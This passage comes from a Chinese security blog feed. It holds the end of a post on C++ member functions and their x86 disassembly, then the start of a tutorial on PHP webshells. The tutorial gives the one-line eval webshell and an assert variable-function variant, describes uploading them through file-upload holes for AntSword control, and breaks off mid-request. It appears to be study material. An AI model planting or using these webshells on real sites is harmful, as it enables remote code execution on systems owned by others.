class=\"line\">\t<span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Mul</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">\t</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> (<span class=\"keyword\">this</span>-&gt;x * <span class=\"keyword\">this</span>-&gt;y);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Div</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">\t</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> (<span class=\"keyword\">this</span>-&gt;x / <span class=\"keyword\">this</span>-&gt;y);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tCal haha;</span><br><span class=\"line\">\thaha.x = <span class=\"number\">5</span>;</span><br><span class=\"line\">\thaha.y = <span class=\"number\">2</span>;</span><br><span class=\"line\">\t<span class=\"type\">int</span> a = haha.<span class=\"built_in\">Add</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d \\n&quot;</span>, a);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0040</span>D768 C7 <span class=\"number\">45</span> F8 <span class=\"number\">05</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> mov         dword ptr [ebp<span class=\"number\">-8</span>],<span class=\"number\">5</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D76F C7 <span class=\"number\">45</span> FC <span class=\"number\">02</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> mov         dword ptr [ebp<span class=\"number\">-4</span>],<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D776 <span class=\"number\">8</span>D <span class=\"number\">4</span>D F8             lea         ecx,[ebp<span class=\"number\">-8</span>]</span><br><span class=\"line\"><span class=\"number\">0040</span>D779 E8 B4 <span class=\"number\">38</span> FF FF       call        @ILT+<span class=\"number\">45</span>(Cal::Add) (<span class=\"number\">00401032</span>)</span><br><span class=\"line\"><span class=\"number\">0040</span>D77E <span class=\"number\">89</span> <span class=\"number\">45</span> F4             mov         dword ptr [ebp<span class=\"number\">-0</span>Ch],eax</span><br><span class=\"line\"><span class=\"number\">0040</span>D781 <span class=\"number\">8B</span> <span class=\"number\">45</span> F4             mov         eax,dword ptr [ebp<span class=\"number\">-0</span>Ch]</span><br><span class=\"line\"><span class=\"number\">0040</span>D784 <span class=\"number\">50</span>                   push        eax</span><br><span class=\"line\"><span class=\"number\">0040</span>D785 <span class=\"number\">68</span> <span class=\"number\">1</span>C <span class=\"number\">20</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;%d %d %d %d\\n&quot;</span> (<span class=\"number\">0042201</span>c)</span><br><span class=\"line\"><span class=\"number\">0040</span>D78A E8 <span class=\"number\">31</span> <span class=\"number\">39</span> <span class=\"function\">FF FF       call        <span class=\"title\">printf</span> <span class=\"params\">(<span class=\"number\">004010</span>c0)</span></span></span><br><span class=\"line\"><span class=\"function\">0040D78F 83 C4 08             add         esp,8</span></span><br><span class=\"line\"><span class=\"function\">0040D792 33 C0                <span class=\"keyword\">xor</span>         eax,eax</span></span><br><span class=\"line\"><span class=\"function\">0040D794 5F                   pop         edi</span></span><br><span class=\"line\"><span class=\"function\">0040D795 5E                   pop         esi</span></span><br><span class=\"line\"><span class=\"function\">0040D796 5B                   pop         ebx</span></span><br><span class=\"line\"><span class=\"function\">0040D797 83 C4 4C             add         esp,4Ch</span></span><br><span class=\"line\"><span class=\"function\">0040D79A 3B EC                cmp         ebp,esp</span></span><br><span class=\"line\"><span class=\"function\">0040D79C E8 9F 39 FF FF       call        __<span class=\"title\">chkesp</span> <span class=\"params\">(<span class=\"number\">00401140</span>)</span></span></span><br><span class=\"line\"><span class=\"function\">0040D7A1 8B E5                mov         esp,ebp</span></span><br><span class=\"line\"><span class=\"function\">0040D7A3 5D                   pop         ebp</span></span><br><span class=\"line\"><span class=\"function\">0040D7A4 C3                   ret</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">0040D80A 89 4D FC             mov         dword ptr [ebp-4],ecx</span></span><br><span class=\"line\"><span class=\"function\">0040D80D 8B 45 FC             mov         eax,dword ptr [ebp-4]</span></span><br><span class=\"line\"><span class=\"function\">0040D810 8B 00                mov         eax,dword ptr [eax]</span></span><br><span class=\"line\"><span class=\"function\">0040D812 8B 4D FC             mov         ecx,dword ptr [ebp-4]</span></span><br><span class=\"line\"><span class=\"function\">0040D815 03 41 04             add         eax,dword ptr [ecx+4]</span></span><br><span class=\"line\"><span class=\"function\">0040D818 5F                   pop         edi</span></span><br><span class=\"line\"><span class=\"function\">0040D819 5E                   pop         esi</span></span><br><span class=\"line\"><span class=\"function\">0040D81A 5B                   pop         ebx</span></span><br><span class=\"line\"><span class=\"function\">0040D81B 8B E5                mov         esp,ebp</span></span><br><span class=\"line\"><span class=\"function\">0040D81D 5D                   pop         ebp</span></span><br><span class=\"line\"><span class=\"function\">0040D81E C3                   ret</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//空结构体大小为1，如果没有成员变量只有成员函数，那么大小也是1</span></span><br><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">Cal</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Add</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">\t</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Sub</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">\t</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">2</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Mul</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">\t</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">3</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Div</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">\t</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">4</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d \\n&quot;</span>, <span class=\"built_in\">sizeof</span>(Cal));   <span class=\"comment\">//1</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">Cal</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Add</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">\t</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Sub</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">\t</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">2</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Mul</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">\t</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">3</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Div</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">\t</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">4</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d \\n&quot;</span>, <span class=\"built_in\">sizeof</span>(Cal));   <span class=\"comment\">//1</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//入栈顺序从右到左</span></span><br><span class=\"line\"><span class=\"comment\">//最后在把this使用ecx传参</span></span><br><span class=\"line\"><span class=\"comment\">//采用内平栈</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Cal</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">\t<span class=\"type\">int</span> x;</span><br><span class=\"line\">\t<span class=\"type\">int</span> y;</span><br><span class=\"line\">\t<span class=\"type\">int</span> z;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">init</span><span class=\"params\">(<span class=\"type\">int</span> x,<span class=\"type\">int</span> y, <span class=\"type\">int</span> z)</span></span></span><br><span class=\"line\"><span class=\"function\">\t</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">this</span>-&gt;x = x;</span><br><span class=\"line\">\t\t<span class=\"keyword\">this</span>-&gt;y = y;\t\t</span><br><span class=\"line\">\t\t<span class=\"keyword\">this</span>-&gt;z = z;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tCal haha;</span><br><span class=\"line\">\thaha.<span class=\"built_in\">init</span>(<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//printf(&quot;%d \\n&quot;, a);</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0040</span>D768 <span class=\"number\">6</span>A <span class=\"number\">05</span>                push        <span class=\"number\">5</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D76A <span class=\"number\">6</span>A <span class=\"number\">04</span>                push        <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D76C <span class=\"number\">6</span>A <span class=\"number\">03</span>                push        <span class=\"number\">3</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D76E <span class=\"number\">8</span>D <span class=\"number\">4</span>D F4             lea         ecx,[ebp<span class=\"number\">-0</span>Ch]</span><br><span class=\"line\"><span class=\"number\">0040</span>D771 E8 C1 <span class=\"number\">38</span> FF FF       call        @ILT+<span class=\"number\">50</span>(Cal::init) (<span class=\"number\">00401037</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0040</span>D7C9 <span class=\"number\">5B</span>                   pop         ebx</span><br><span class=\"line\"><span class=\"number\">0040</span>D7CA <span class=\"number\">8B</span> E5                mov         esp,ebp</span><br><span class=\"line\"><span class=\"number\">0040</span>D7CC <span class=\"number\">5</span>D                   pop         ebp</span><br><span class=\"line\"><span class=\"number\">0040</span>D7CD C2 <span class=\"number\">0</span>C <span class=\"number\">00</span>             ret         <span class=\"number\">0</span>Ch</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "逆向"
            ]
        },
        {
            "id": "http://example.com/2022/12/31/webshell/",
            "url": "http://example.com/2022/12/31/webshell/",
            "title": "webshell",
            "date_published": "2022-12-31T05:38:45.000Z",
            "content_html": "<h1 id=\"php-webshell\"><a class=\"markdownIt-Anchor\" href=\"#php-webshell\">#</a> php webshell</h1>\n<h2 id=\"eval与assert一句话木马分析\"><a class=\"markdownIt-Anchor\" href=\"#eval与assert一句话木马分析\">#</a> eval 与 assert 一句话木马分析</h2>\n<p>实验环境:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php:5.4.45</span><br><span class=\"line\">mysql:5.5.62</span><br></pre></td></tr></table></figure>\n<p>注意：这小节中使用 php5 作为 php 实验环境，但 php5 和 php7 在一些函数中有改变，会在下一小节详细叙述</p>\n<h3 id=\"eval定义和用法\"><a class=\"markdownIt-Anchor\" href=\"#eval定义和用法\">#</a> eval 定义和用法</h3>\n<blockquote>\n<p>eval () 函数把字符串按照 PHP 代码来计算（计算 = 执行）。</p>\n<p>该字符串必须是合法的 PHP 代码，且必须以分号结尾。</p>\n<p>如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 eval () 函数返回 false</p>\n<p>返回语句会立即终止对字符串的计算。</p>\n<p>注释：该函数对于在数据库文本字段中供日后计算而进行的代码存储很有用</p>\n</blockquote>\n<h3 id=\"assert的定义与用法\"><a class=\"markdownIt-Anchor\" href=\"#assert的定义与用法\">#</a> assert 的定义与用法</h3>\n<blockquote>\n<p>assert () 功能是判断一个表达式是否成立，返回 true or false，重点是函数会执行此表达式。如果表达式为函数如 assert (“echo (1)”)，则会输出 1，而如果 assert (“echo 1;”) 则不会有输出。</p>\n<p>assert 把整个字符串参数当 php 代码执行</p>\n<p>assert 在 php 中被认为是一个函数</p>\n</blockquote>\n<h3 id=\"eval与assert的区别\"><a class=\"markdownIt-Anchor\" href=\"#eval与assert的区别\">#</a> eval 与 assert 的区别</h3>\n<blockquote>\n<p>二者都可以执行 PHP 语句。（eval 规范更加严格一些，必须符合 PHP 代码要求。而 assert 则没有那么严格，执行 PHP 表达式即可。并不是对 assert 无计可施，可以采用 assert_option () 来进行对 assert 的控制）但是在生产环境强烈建议不使用 assert 函数 (哪怕对其限制，也并不安全)。</p>\n<p>都常被用来写一句话木马</p>\n</blockquote>\n<blockquote>\n<p>eval 是一个<strong>语言构造器</strong>（是 PHP 自身的语言结构）而不是一个函数，<strong>不能被可变函数调用</strong>；assert 在 php 中被认为是一个函数，能被可变函数调用。</p>\n<p>eval 规范更加严格一些，必须符合 PHP 代码要求，assert 则没有那么严格，执行 PHP 表达式即可</p>\n</blockquote>\n<h3 id=\"php可变函数\"><a class=\"markdownIt-Anchor\" href=\"#php可变函数\">#</a> php 可变函数</h3>\n<p>PHP 支持变量函数：通过变量保存一个函数的名字，然后在变量后跟上一个小括号就能调用。变量函数可以用来编写 webshell 绕过。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    function website()&#123;</span><br><span class=\"line\">        echo &#x27;C语言中文网&lt;br&gt;&#x27;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    function url($str = &#x27;&#x27;)&#123;</span><br><span class=\"line\">        echo $str.&#x27;&lt;br&gt;&#x27;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    function title($string)&#123;</span><br><span class=\"line\">        echo $string;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    $funcname = &#x27;website&#x27;;</span><br><span class=\"line\">    $funcname();</span><br><span class=\"line\">    $funcname = &#x27;url&#x27;;</span><br><span class=\"line\">    $funcname(&#x27;http://c.biancheng.net/php/&#x27;);</span><br><span class=\"line\">    $funcname = &#x27;title&#x27;;</span><br><span class=\"line\">    $string = &#x27;PHP 教程&#x27;;</span><br><span class=\"line\">    $funcname($string);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C语言中文网</span><br><span class=\"line\">http://c.biancheng.net/php/</span><br><span class=\"line\">PHP 教程</span><br></pre></td></tr></table></figure>\n<h3 id=\"php-语法构造器\"><a class=\"markdownIt-Anchor\" href=\"#php-语法构造器\">#</a> php 语法构造器</h3>\n<p><strong>php 语法构造器不能被可变函数调用</strong></p>\n<p>eval 属于 PHP 语法构造的一部分，并不是一个函数，所以不能通过变量函数的形式来调用（虽然她确实像极了函数原型），这样的语法构造还包括：echo，print，unset ()，isset ()，empty ()，include，require 等。换句话说就是 echo，print，unset ()，isset ()，empty ()，include，require 等语言结构不能被可变函数调用。</p>\n<p>PHP 支持可变函数的概念。这意味着如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来实现包括回调函数，函数表在内的一些用途。</p>\n<p>print 和 print_r 在 PHP 中都起打印语句的作用， <code>print</code> <strong> 属于不能被可变函数调用的那一类，</strong> <code>print_r</code> <strong> 属于能被可变函数调用的那一类。</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$b = &#x27;print_r&#x27;;</span><br><span class=\"line\">$b(&#x27;print_r 能被可变函数调用 &lt;br&gt;&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">$a = &#x27;print&#x27;;</span><br><span class=\"line\">$a(&#x27;print 不能被可变函数调用 &lt;br&gt;&#x27;);</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">print_r 能被可变函数调用</span><br><span class=\"line\"></span><br><span class=\"line\">Fatal error: Call to undefined function print() in D:\\wwwroot\\www.shinya.com\\printr.php on line 6</span><br></pre></td></tr></table></figure>\n<p>eval 和 assert 都可以执行 PHP 语句， <code>eval</code> <strong> 属于不能被可变函数调用的那一类，</strong> <code>assert</code> <strong> 属于能被可变函数调用的那一类。</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$c = &#x27;eval&#x27;;</span><br><span class=\"line\">$c(phpinfo());</span><br><span class=\"line\">//Fatal error: Call to undefined function eval() in D:\\wwwroot\\www.shinya.com\\printr.php on line 3</span><br><span class=\"line\"></span><br><span class=\"line\">$d = &#x27;assert&#x27;;</span><br><span class=\"line\">$d(phpinfo());</span><br><span class=\"line\">//PHP Version 5.4.45</span><br></pre></td></tr></table></figure>\n<p>这么看来 eval 其实并不能算是‘函数’，而是 PHP 自身的语言结构，如果需要用‘可变’的方式调用，需要自己构造，类似这样子的：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">function eval_1($str)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">   eval($str);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">$a=&#x27;eval_1&#x27;;</span><br><span class=\"line\">$a(&#x27;phpinfo()&#x27;);</span><br><span class=\"line\">?&gt; </span><br></pre></td></tr></table></figure>\n<p><strong>eval 其实是 Zend 的函数，而 assert 是 PHP_FUNCTION 宏编写的，最后在调用上是不同的。</strong></p>\n<h3 id=\"一句话木马的原理\"><a class=\"markdownIt-Anchor\" href=\"#一句话木马的原理\">#</a> 一句话木马的原理</h3>\n<p>利用文件上传漏洞，往目标网站中上传一句话木马，然后你就可以在本地通过蚁剑等 webshell 工具即可获取和控制整个网站目录。</p>\n<p>php 一句话木马:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php @eval($_POST[&#x27;shell&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>\n<p>@表示后面即使执行错误，也不报错。eval（）函数表示括号内的语句字符串什么的全都当做代码执行。$_POST [‘shell’] 表示 shell 的取值为 HTTP 的 POST 方式。即通过 eval () 函数执行 shell 里面的内容，并且不报错。</p>\n<p>中国蚁剑也同时 post 了 xian 这个数据为 %40ini_set 之类的数据，而我们又必须清楚一点，我们的 eval 函数中参数是字符，assert 函数中参数为表达式 （或者为函数），如：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assert(eval(‘echo 1;’));//类似这样</span><br><span class=\"line\">1=assert</span><br><span class=\"line\">2=eval(base64_decode())</span><br><span class=\"line\">$_POST[&#x27;1&#x27;]($_POST[2])</span><br><span class=\"line\">assert(eval(base64_decode))</span><br></pre></td></tr></table></figure>\n<h3 id=\"_post1_post2\"><a class=\"markdownIt-Anchor\" href=\"#_post1_post2\">#</a> \\_POST\\['1'](_POST[‘2’]);</h3>\n<p>post 传入参数  <code>1=assert&amp;2=phpinfo();</code>  phpinfo () 被执行，证明木马可用</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219115041090.png\" alt=\"image-20221219115041090\" style=\"zoom:80%;\" />\n<h4 id=\"连接方式一\"><a class=\"markdownIt-Anchor\" href=\"#连接方式一\">#</a> <strong>连接方式一：</strong></h4>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219115254130.png\" alt=\"image-20221219115254130\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219115339983.png\" alt=\"image-20221219115339983\"></p>\n<p>连接密码和下面的 $_POST 中的内容一致，编码可选，不影响连接</p>\n<p>payload 分析：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /uuuu.php HTTP/1.1</span><br><span class=\"line\">Host: 127.0.0.1:18888</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">User-Agent: antSword/v2.1</span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\">Content-Length: 1026</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\"></span><br><span 